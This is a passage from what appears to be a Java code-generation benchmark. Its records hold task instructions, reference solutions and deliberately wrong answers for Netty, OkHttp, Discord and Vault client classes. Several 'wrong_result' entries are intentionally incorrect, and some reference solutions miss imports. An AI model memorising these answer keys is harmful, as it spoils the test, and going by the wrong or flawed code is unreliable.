{\n            return false;\n        }\n    }\n\n    private static EventLoopGroup createEventLoopGroup(Transport transport, int threadCount) {\n        switch (transport) {\n            case EPOLL:\n                return new EpollEventLoopGroup(threadCount);\n            case KQUEUE:\n                return new KQueueEventLoopGroup(threadCount);\n            case IOURING:\n                return new IOUringEventLoopGroup(threadCount);\n            default:\n                return new NioEventLoopGroup(threadCount);\n        }\n    }\n\n    private static Class<? extends Channel> getChannelClass(Transport transport) {\n        switch (transport) {\n            case EPOLL:\n                return EpollDatagramChannel.class;\n            case KQUEUE:\n                return KQueueDatagramChannel.class;\n            case IOURING:\n                return IOUringDatagramChannel.class;\n            default:\n                return NioDatagramChannel.class;\n        }\n    }\n}"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Java class that implements a UDP client using Netty framework for sending and receiving datagram packets. The client should be able to start a connection, send messages to a specified host and port, handle console input for sending messages, and gracefully shutdown the connection.\n\nClass Description: DatagramChannelEchoClient is a Netty-based UDP client that establishes a connection to a specified host and port, sends messages via UDP datagrams, and can be controlled through console input. It manages network resources efficiently and provides clean shutdown capabilities.\n\nAttributes:\n- host: String - The target host address to which messages will be sent\n- port: int - The target port number on the host\n- group: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - The Netty channel used for UDP communication\n\nMethods:\n- DatagramChannelEchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the UDP client by initializing Netty components and binding to the port\n- sendMessage(String message) -> void - Sends a message to the configured host and port via UDP\n- stop() -> void - Gracefully shuts down the client and releases resources\n- runConsoleInput() -> void - Reads input from console and sends it as messages until terminated",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\n\npublic final class DatagramChannelEchoClient {\n\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new DatagramChannelEchoClientHandler());\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n        System.out.println(\"DatagramChannelEchoClient\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(new io.netty.channel.socket.DatagramPacket(\n            buf, new InetSocketAddress(host, port)));\n        writeBuffer.clear();\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + host);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + host);\n            System.exit(1);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public class DatagramChannelEchoClient {\n    private final String host;\n    private final int port;\n    private final EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .handler(new ChannelInitializer<NioDatagramChannel>() {\n             @Override\n             protected void initChannel(NioDatagramChannel ch) {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 pipeline.addLast(new DatagramPacketEncoder());\n                 pipeline.addLast(new DatagramPacketDecoder());\n                 pipeline.addLast(new SimpleChannelInboundHandler<ByteBuf>() {\n                     @Override\n                     protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n                         System.out.println(\"Received: \" + msg.toString(CharsetUtil.UTF_8));\n                     }\n                 });\n             }\n         });\n\n        channel = b.bind(0).sync().channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuf buf = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);\n        channel.writeAndFlush(new DatagramPacket(buf, new InetSocketAddress(host, port)));\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        group.shutdownGracefully();\n    }\n\n    public void runConsoleInput() {\n        Scanner scanner = new Scanner(System.in);\n        try {\n            while (scanner.hasNextLine()) {\n                String line = scanner.nextLine();\n                if (line.equalsIgnoreCase(\"exit\")) {\n                    break;\n                }\n                sendMessage(line);\n            }\n        } finally {\n            scanner.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a utility class for retrieving Discord guild widget information using HTTP requests.\n\nClass Description: WidgetUtil is a utility class that provides functionality to fetch Discord guild widget data through REST API calls. It handles HTTP communication, response processing, and error handling for widget retrieval operations.\n\nAttributes:\nWIDGET_URL: [String] - The URL template for accessing Discord guild widget JSON data, using the default REST API base URL.\n\nMethods:\ngetWidget: [getWidget]([long guildId]) -> [Widget] - Retrieves the widget information for a specified Discord guild ID. Handles various HTTP response codes including success (200), not found (404), forbidden (403), and rate limiting (429). Throws RateLimitedException when rate limited and UncheckedIOException for IO errors. Returns null if the widget doesn't exist or is inaccessible.",
    "Canonical_solution": "import net.dv8tion.jda.api.entities.Widget;\nimport net.dv8tion.jda.api.exceptions.RateLimitedException;\nimport net.dv8tion.jda.api.requests.RestConfig;\nimport net.dv8tion.jda.api.utils.data.DataObject;\nimport net.dv8tion.jda.internal.entities.WidgetImpl;\nimport net.dv8tion.jda.internal.utils.Checks;\nimport net.dv8tion.jda.internal.utils.IOUtil;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil \n{\n    public static final String WIDGET_URL = RestConfig.DEFAULT_BASE_URL + \"guilds/%s/widget.json\";\n\n    @Nullable\n    public static Widget getWidget(long guildId) throws RateLimitedException\n    {\n        Checks.notNull(guildId, \"GuildId\");\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n                    .url(String.format(WIDGET_URL, guildId))\n                    .method(\"GET\", null)\n                    .header(\"user-agent\", RestConfig.USER_AGENT)\n                    .header(\"accept-encoding\", \"gzip\")\n                    .build();\n\n        try (Response response = client.newCall(request).execute())\n        {\n            final int code = response.code();\n            InputStream data = IOUtil.getBody(response);\n\n            switch (code)\n            {\n                case 200:\n                    try (InputStream stream = data)\n                    {\n                        return new WidgetImpl(DataObject.fromJson(stream));\n                    }\n                    catch (IOException e)\n                    {\n                        throw new UncheckedIOException(e);\n                    }\n                case 400:\n                case 404:\n                    return null;\n                case 403:\n                    return new WidgetImpl(guildId);\n                case 429:\n                    long retryAfter;\n                    try (InputStream stream = data)\n                    {\n                        retryAfter = DataObject.fromJson(stream).getLong(\"retry_after\");\n                    }\n                    catch (Exception e)\n                    {\n                        retryAfter = 0;\n                    }\n                    throw new RateLimitedException(WIDGET_URL, retryAfter);\n                default:\n                    throw new IllegalStateException(\"An unknown status was returned: \" + code + \" \" + response.message());\n            }\n        }\n        catch (IOException e)\n        {\n            throw new UncheckedIOException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class WidgetUtil {\n    private static final String WIDGET_URL = \"https://discord.com/api/guilds/%d/widget.json\";\n\n    public static Widget getWidget(long guildId) {\n        try {\n            URL url = new URL(String.format(WIDGET_URL, guildId));\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                return parseWidget(response.toString());\n            } else if (responseCode == 404 || responseCode == 403) {\n                return null;\n            } else if (responseCode == 429) {\n                throw new RateLimitedException(\"Rate limited by Discord API\");\n            } else {\n                throw new UncheckedIOException(\"Failed to retrieve widget: \" + responseCode);\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    private static Widget parseWidget(String json) {\n        // Implementation for parsing JSON into Widget object\n        return new Widget();\n    }\n}\n\nclass Widget {\n    // Widget data structure\n}\n\nclass RateLimitedException extends RuntimeException {\n    public RateLimitedException(String message) {\n        super(message);\n    }\n}\n\nclass UncheckedIOException extends RuntimeException {\n    public UncheckedIOException(String message) {\n        super(message);\n    }\n\n    public UncheckedIOException(IOException cause) {\n        super(cause);\n    }\n}"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using OkHttp library, supporting both regular and DNS-over-HTTPS (DoH) connections, with caching capabilities and custom DNS fallback mechanisms.\n\nClass Description: The HttpClient class provides static methods for performing HTTP GET and POST requests with configurable caching and DNS options. It maintains four different client configurations (regular/DoH with/without cache) and handles response processing with error checking.\n\nAttributes:\n- httpClient: [OkHttpClient] - Standard HTTP client without cache\n- httpClientDoH: [OkHttpClient] - HTTP client with DNS-over-HTTPS support\n- httpClientWithCache: [OkHttpClient] - HTTP client with caching enabled\n- httpClientWithCacheDoH: [OkHttpClient] - HTTP client with both caching and DoH\n- fallbackDNS: [FallBackDNS] - Custom DNS resolver with fallback functionality\n- doh: [boolean] - Flag indicating whether DoH is enabled\n\nMethods:\n- getHttpClient() -> [OkHttpClient] - Returns appropriate HTTP client based on DoH setting\n- getHttpClientWithCache() -> [OkHttpClient] - Returns cached HTTP client based on DoH setting\n- doHttpGet(String url, boolean allowCache) -> [byte[]] - Performs HTTP GET request and returns response body as bytes\n- doHttpPost(String url, String data, boolean allowCache) -> [byte[]] - Performs HTTP POST request with JSON payload and returns response body as bytes\n- followRedirects(OkHttpClient.Builder builder, boolean followRedirects) -> [OkHttpClient.Builder] - Configures redirect following behavior for client builder\n- checkNeedCaptchaAndroidacy(String url, int errorCode) -> [void] - Checks if Androidacy URL requires captcha\n- JsonRequestBody: [static inner class] - Custom RequestBody implementation for JSON data\n\nStatic Initialization Block:\n- Initializes all HTTP client configurations with timeout settings, proxy configuration, and DNS setup (including DoH fallback)",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Handler;\nimport android.os.Looper;\n\nimport com.fox2code.mmm.MainApplication;\nimport com.fox2code.mmm.R;\nimport com.fox2code.mmm.androidacy.AndroidacyUtil;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\n\nimport javax.net.ssl.SSLException;\n\nimport okhttp3.Cache;\nimport okhttp3.Dns;\nimport okhttp3.HttpUrl;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport okhttp3.dnsoverhttps.DnsOverHttps;\nimport okhttp3.logging.HttpLoggingInterceptor;\nimport okio.BufferedSink;\nimport timber.log.Timber;\n\npublic class HttpClient {\n    private static final OkHttpClient httpClient;\n    private static final OkHttpClient httpClientDoH;\n    private static final OkHttpClient httpClientWithCache;\n    private static final OkHttpClient httpClientWithCacheDoH;\n    private static final FallBackDNS fallbackDNS;\n    private static boolean doh;\n\n    static {\n        MainApplication mainApplication = MainApplication.getINSTANCE();\n        OkHttpClient.Builder httpclientBuilder = new OkHttpClient.Builder();\n        httpclientBuilder.connectTimeout(5, TimeUnit.SECONDS);\n        httpclientBuilder.writeTimeout(10, TimeUnit.SECONDS);\n        httpclientBuilder.readTimeout(15, TimeUnit.SECONDS);\n        httpclientBuilder.proxy(Proxy.NO_PROXY);\n        Dns dns = Dns.SYSTEM;\n        try {\n            InetAddress[] cloudflareBootstrap = new InetAddress[]{InetAddress.getByName(\"162.159.36.1\"), InetAddress.getByName(\"162.159.46.1\"), InetAddress.getByName(\"1.1.1.1\"), InetAddress.getByName(\"1.0.0.1\"), InetAddress.getByName(\"162.159.132.53\"), InetAddress.getByName(\"2606:4700:4700::1111\"), InetAddress.getByName(\"2606:4700:4700::1001\"), InetAddress.getByName(\"2606:4700:4700::0064\"), InetAddress.getByName(\"2606:4700:4700::6400\")};\n            dns = s -> {\n                if (\"cloudflare-dns.com\".equals(s)) {\n                    return Arrays.asList(cloudflareBootstrap);\n                }\n                return Dns.SYSTEM.lookup(s);\n            };\n            httpclientBuilder.dns(dns);\n            dns = new DnsOverHttps.Builder().client(httpclientBuilder.build()).url(Objects.requireNonNull(HttpUrl.parse(\"https://cloudflare-dns.com/dns-query\"))).bootstrapDnsHosts(cloudflareBootstrap).resolvePrivateAddresses(true).build();\n        } catch (UnknownHostException | RuntimeException e) {\n            Timber.e(e, \"Failed to init DoH\");\n        }\n        fallbackDNS = new FallBackDNS(mainApplication, dns, \"github.com\", \"api.github.com\", \"raw.githubusercontent.com\", \"camo.githubusercontent.com\", \"user-images.githubusercontent.com\", \"cdn.jsdelivr.net\", \"img.shields.io\", \"magisk-modules-repo.github.io\", \"www.androidacy.com\", \"api.androidacy.com\", \"production-api.androidacy.com\");\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClient = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientDoH = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.cache(new Cache(new File(mainApplication.getCacheDir(), \"http_cache\"), 16L * 1024L * 1024L));\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClientWithCache = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientWithCacheDoH = followRedirects(httpclientBuilder, true).build();\n        doh = MainApplication.isDohEnabled();\n    }\n\n    private static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        return builder.followRedirects(followRedirects).followSslRedirects(followRedirects);\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    @SuppressLint(\"RestrictedApi\")\n    public static byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).get().build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            if (response.code() == 401 && AndroidacyUtil.isAndroidacyLink(url)) {\n                throw new HttpException(\"Androidacy token is invalid\", 401);\n            }\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).post(JsonRequestBody.from(data)).header(\"Content-Type\", \"application/json\").build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    private static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        if (errorCode == 403 && AndroidacyUtil.isAndroidacyLink(url)) {\n            needCaptchaAndroidacyHost = Uri.parse(url).getHost();\n        }\n    }\n\n    private static class JsonRequestBody extends RequestBody {\n        private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json\");\n        private static final JsonRequestBody EMPTY = new JsonRequestBody(new byte[0]);\n        final byte[] data;\n\n        private JsonRequestBody(byte[] data) {\n            this.data = data;\n        }\n\n        static JsonRequestBody from(String data) {\n            if (data == null || data.length() == 0) {\n                return EMPTY;\n            }\n            return new JsonRequestBody(data.getBytes(StandardCharsets.UTF_8));\n        }\n\n        @Override\n        public MediaType contentType() {\n            return JSON_MEDIA_TYPE;\n        }\n\n        @Override\n        public long contentLength() {\n            return this.data.length;\n        }\n\n        @Override\n        public void writeTo(@NonNull BufferedSink bufferedSink) throws IOException {\n            bufferedSink.write(this.data);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "okhttp3.OkHttpClient httpClient;\nokhttp3.OkHttpClient httpClientDoH;\nokhttp3.OkHttpClient httpClientWithCache;\nokhttp3.OkHttpClient httpClientWithCacheDoH;\nFallBackDNS fallbackDNS;\nboolean doh;\n\npublic static okhttp3.OkHttpClient getHttpClient() {\n    return httpClient;\n}\n\npublic static okhttp3.OkHttpClient getHttpClientWithCache() {\n    return httpClientWithCache;\n}\n\npublic static byte[] doHttpGet(String url, boolean allowCache) throws Exception {\n    okhttp3.Request request = new okhttp3.Request.Builder().url(url).build();\n    okhttp3.Response response = allowCache ? httpClientWithCache.newCall(request).execute() : httpClient.newCall(request).execute();\n    if (!response.isSuccessful()) throw new Exception(\"HTTP error code: \" + response.code());\n    return response.body().bytes();\n}\n\npublic static byte[] doHttpPost(String url, String data, boolean allowCache) throws Exception {\n    okhttp3.RequestBody body = new JsonRequestBody(data);\n    okhttp3.Request request = new okhttp3.Request.Builder().url(url).post(body).build();\n    okhttp3.Response response = allowCache ? httpClientWithCache.newCall(request).execute() : httpClient.newCall(request).execute();\n    if (!response.isSuccessful()) throw new Exception(\"HTTP error code: \" + response.code());\n    return response.body().bytes();\n}\n\npublic static okhttp3.OkHttpClient.Builder followRedirects(okhttp3.OkHttpClient.Builder builder, boolean followRedirects) {\n    if (followRedirects) {\n        builder.followSslRedirects(true);\n        builder.followRedirects(true);\n    }\n    return builder;\n}\n\npublic static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n    // Implementation for checking captcha requirement\n}\n\nstatic class JsonRequestBody extends okhttp3.RequestBody {\n    private final String json;\n\n    JsonRequestBody(String json) {\n        this.json = json;\n    }\n\n    @Override\n    public okhttp3.MediaType contentType() {\n        return okhttp3.MediaType.get(\"application/json; charset=utf-8\");\n    }\n\n    @Override\n    public void writeTo(okio.BufferedSink sink) throws IOException {\n        sink.writeUtf8(json);\n    }\n}\n\n{\n    okhttp3.OkHttpClient.Builder clientBuilder = new okhttp3.OkHttpClient.Builder();\n    clientBuilder.connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilder.readTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilder.writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilder.proxy(java.net.Proxy.NO_PROXY);\n    httpClient = clientBuilder.build();\n\n    okhttp3.OkHttpClient.Builder clientBuilderDoH = new okhttp3.OkHttpClient.Builder();\n    clientBuilderDoH.connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderDoH.readTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderDoH.writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderDoH.proxy(java.net.Proxy.NO_PROXY);\n    fallbackDNS = new FallBackDNS();\n    clientBuilderDoH.dns(fallbackDNS);\n    httpClientDoH = clientBuilderDoH.build();\n\n    okhttp3.Cache cache = new okhttp3.Cache(new java.io.File(\"cache\"), 10 * 1024 * 1024);\n    okhttp3.OkHttpClient.Builder clientBuilderWithCache = new okhttp3.OkHttpClient.Builder();\n    clientBuilderWithCache.connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCache.readTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCache.writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCache.proxy(java.net.Proxy.NO_PROXY);\n    clientBuilderWithCache.cache(cache);\n    httpClientWithCache = clientBuilderWithCache.build();\n\n    okhttp3.OkHttpClient.Builder clientBuilderWithCacheDoH = new okhttp3.OkHttpClient.Builder();\n    clientBuilderWithCacheDoH.connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCacheDoH.readTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCacheDoH.writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS);\n    clientBuilderWithCacheDoH.proxy(java.net.Proxy.NO_PROXY);\n    clientBuilderWithCacheDoH.cache(cache);\n    clientBuilderWithCacheDoH.dns(fallbackDNS);\n    httpClientWithCacheDoH = clientBuilderWithCacheDoH.build();\n}"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Implement a VaultClient class that interacts with a Vault server's transit engine to perform key wrapping and unwrapping operations for cryptographic purposes, using HTTP REST API calls.\n\nClass Description: The VaultClient class implements the KmsClient interface and provides functionality to encrypt (wrap) and decrypt (unwrap) keys using a Vault server's transit engine. It handles HTTP communication, request building, response processing, and error handling.\n\nAttributes:\n- LOG: Logger - Used for logging information and errors\n- JSON_MEDIA_TYPE: MediaType - Constant for JSON content type\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- kmsToken: String - Authentication token for Vault server\n- hadoopConfiguration: Configuration - Hadoop configuration object\n- endPointPrefix: String - Base URL prefix for Vault API endpoints\n- httpClient: OkHttpClient - HTTP client for making requests\n\nMethods:\n- getContentFromTransitEngine(String, String, String) -> String - Sends a POST request to Vault's transit engine endpoint with the given payload and master key identifier\n- executeAndGetResponse(String, Request) -> String - Executes HTTP request and handles response, including error cases\n- buildPayload(Map<String, String>) -> String - Converts a parameter map to JSON string\n- wrapKey(byte[], String) -> String - Encrypts/wraps a key using the specified master key\n- unwrapKey(String, String) -> byte[] - Decrypts/unwraps a key using the specified master key\n- parseReturn(String, String) -> String - Parses the response from Vault to extract the required value\n- refreshToken() -> void - Refreshes the authentication token (implementation not shown in reference code)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\nimport okhttp3.ConnectionSpec;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.parquet.crypto.KeyAccessDeniedException;\nimport org.apache.parquet.crypto.ParquetCryptoRuntimeException;\nimport org.apache.parquet.crypto.keytools.KeyToolkit;\nimport org.apache.parquet.crypto.keytools.KmsClient;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class VaultClient implements KmsClient {\n  private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n  private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n  private static final ObjectMapper objectMapper = new ObjectMapper();\n\n  private String kmsToken;\n  private Configuration hadoopConfiguration;\n  private String endPointPrefix;\n  private OkHttpClient httpClient = new OkHttpClient.Builder()\n      .connectionSpecs(Arrays.asList(ConnectionSpec.MODERN_TLS, ConnectionSpec.COMPATIBLE_TLS))\n      .build();\n\n  private String getContentFromTransitEngine(String endPoint, String jPayload, String masterKeyIdentifier) {\n    LOG.info(\"masterKeyIdentifier: \" + masterKeyIdentifier);\n\n    final RequestBody requestBody = RequestBody.create(JSON_MEDIA_TYPE, jPayload);\n    Request request = new Request.Builder()\n        .url(endPoint + masterKeyIdentifier)\n        .header(\"X-Vault-Token\", kmsToken)\n        .post(requestBody)\n        .build();\n\n    return executeAndGetResponse(endPoint, request);\n  }\n\n  private String executeAndGetResponse(String endPoint, Request request) {\n    Response response = null;\n    try {\n      response = httpClient.newCall(request).execute();\n      final String responseBody = response.body().string();\n      if (response.isSuccessful()) {\n        return responseBody;\n      } else {\n        if ((401 == response.code()) || (403 == response.code())) {\n          throw new KeyAccessDeniedException(responseBody);\n        }\n        throw new IOException(\"Vault call [\" + endPoint + \"] didn't succeed: \" + responseBody);\n      }\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Vault call [\" + request.url().toString() + endPoint + \"] didn't succeed\", e);\n    } finally {\n      if (null != response) {\n        response.close();\n      }\n    }\n  }\n\n  private String buildPayload(Map<String, String> paramMap) {\n    String jsonValue;\n    try {\n      jsonValue = objectMapper.writeValueAsString(paramMap);\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\"Failed to build payload\", e);\n    }\n    return jsonValue;\n  }\n\n  @Override\n  public String wrapKey(byte[] keyBytes, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    final String dataKeyStr = Base64.getEncoder().encodeToString(keyBytes);\n    writeKeyMap.put(\"plaintext\", dataKeyStr);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"encrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    return parseReturn(response, \"ciphertext\");\n  }\n\n  @Override\n  public byte[] unwrapKey(String wrappedKey, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    writeKeyMap.put(\"ciphertext\", wrappedKey);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"decrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    String plaintext = parseReturn(response, \"plaintext\");\n    return Base64.getDecoder().decode(plaintext);\n  }\n\n  private static String parseReturn(String response, String searchKey) {\n    String matchingValue;\n    try {\n      matchingValue = objectMapper.readTree(response).findValue(searchKey).textValue();\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to parse vault response. \" + searchKey + \" not found.\" + response, e);\n    }\n\n    if (null == matchingValue) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to match vault response. \" + searchKey + \" not found.\" + response);\n    }\n    return matchingValue;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "{\"LOG\": \"Logger\", \"JSON_MEDIA_TYPE\": \"MediaType\", \"objectMapper\": \"ObjectMapper\", \"kmsToken\": \"String\", \"hadoopConfiguration\": \"Configuration\", \"endPointPrefix\": \"String\", \"httpClient\": \"OkHttpClient\", \"getContentFromTransitEngine\": \"String\", \"executeAndGetResponse\": \"String\", \"buildPayload\": \"String\", \"wrapKey\": \"String\", \"unwrapKey\": \"byte[]\", \"parseReturn\": \"String\", \"refreshToken\": \"void\"}"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a Java class that provides file processing capabilities using Java NIO's FileChannel for efficient file operations including memory-mapped file access and direct buffer reading.\n\nClass Description: FileChannelProcessor is a utility class that handles file operations using Java NIO's FileChannel. It supports memory-mapped file access (MappedByteBuffer) and direct buffer reading (ByteBuffer) with methods for opening/closing channels, mapping file segments, reading buffer segments, and finding line boundaries in buffers.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nfilePath: Path - The path to the file being processed\nMAX_LINE_LENGTH: int (static final) - Maximum expected line length for boundary finding\nMMAP_CHUNK_SIZE: int (static final) - Maximum size for memory-mapped file segments\n\nMethods:\nopenChannel: void() throws IOException - Opens a read-only FileChannel for the specified file path\nmapFileSegment: MappedByteBuffer(long start, long size) throws IOException - Maps a file segment into memory as a read-only MappedByteBuffer\nreadBufferSegment: ByteBuffer(long position, int length) throws IOException - Reads a file segment into a direct ByteBuffer\nfindLineBoundary: long(ByteBuffer buffer, long startPosition) - Finds the position of the next line boundary in a buffer\ncloseChannel: void() throws IOException - Closes the FileChannel if it's open\ngetFileSize: long() throws IOException - Returns the size of the file associated with the FileChannel",
